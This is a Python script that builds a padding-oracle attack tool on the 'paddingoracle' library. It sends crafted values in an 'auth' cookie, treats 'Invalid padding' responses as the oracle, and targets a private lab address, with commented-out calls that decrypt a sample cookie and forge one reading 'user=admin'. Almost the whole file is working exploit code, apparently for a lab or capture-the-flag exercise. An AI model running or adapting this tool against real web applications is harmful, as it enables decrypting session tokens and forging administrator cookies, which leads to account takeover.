#!/usr/bin/env python
from paddingoracle import BadPaddingException, PaddingOracle

class RequestPadbuster(PaddingOracle):
    '''Instance of PaddingOracle that sets some default parameters using the requests module'''

    import socket
    import time
    import requests

    def __init__(self, **kwargs):
        '''Constructor with sensible requests defaults'''

        super(RequestPadbuster, self).__init__(**kwargs)
        self.session = self.requests.Session()
        self.wait = kwargs.get('wait', 2.0)
        self.session.verify = kwargs.get('verify', False)
        self.session.timeout = kwargs.get('timeout', 5)
        self.session.stream = kwargs.get('stream', False)
        self.session.proxies = kwargs.get('proxies', {})
        self.session.headers = kwargs.get('headers', {})
        self.session.allow_redirects = kwargs.get('allow_redirects', True)
        self.session.cookies = self.requests.utils.cookiejar_from_dict(kwargs.get('cookies', {}))
        self.url = kwargs.get('url', None)
        if not self.url:
            raise ValueError('No value for url provided')


    def doRequest(self, payload):
        '''Perform the padding request incorporating payload using the requests session object in self.session, return the response'''
        raise NotImplementedError


    def encode(self, input):
        '''Performs encoding of raw payload data to something acceptable by application, return the encoded value'''
        raise NotImplementedError


    def checkResponse(self, response):
        '''Check the response from the app, return True for a value indicating a padding error, False for correct padding'''
        raise NotImplementedError



    def oracle(self, data, **kwargs):
        '''Implementation of oracle function'''
        payload = self.encode(data)

        while 1:
            try:
                response = self.doRequest(payload)
                break
            except (self.socket.error, self.requests.exceptions.RequestException):
                logging.exception('Retrying request in %.2f seconds...', self.wait)
                self.time.sleep(self.wait)
                continue

        self.history.append(response)

        if self.checkResponse(response):
            raise BadPaddingException




class PadBuster(RequestPadbuster):
    '''Example subclass implementation of RequestPadbuster class'''
    import urllib
    import base64

    def doRequest(self, payload):
        '''Perform the padding request incorporating payload using the requests session object in self.session, return the response'''
        self.session.cookies['auth'] = payload
        return self.session.get(self.url)

    def encode(self, input):
        '''Performs encoding of raw payload data to something acceptable by application, return the encoded value'''
        return self.urllib.quote(self.base64.b64encode(input))

    def checkResponse(self, response):
        '''Check the response from the app, return True for a value indicating a padding error, False for correct padding'''
        return 'Invalid padding' in response.text




if __name__ == '__main__':
    import logging
    from base64 import b64decode
    from urllib import unquote

    logging.basicConfig(level=logging.DEBUG)

    encrypt_string = 'user=admin'
    cookie = 'A41WLaMt2MZ87HXpVnX1l78u%2BjO0vjiU'
    raw_data = b64decode(unquote(cookie))

    padbuster = PadBuster(url='http://192.168.33.101/index.php')

    #decrypted = padbuster.decrypt(raw_data, block_size=8, iv=None)
    #print 'Decrypted cookie: %s => %r' % (cookie, decrypted)

    #encrypted = padbuster.encrypt(encrypt_string, block_size=8, iv=None)
    #print 'New encrypted cookie for value %s => %s' %(encrypt_string, padbuster.encode(encrypted))
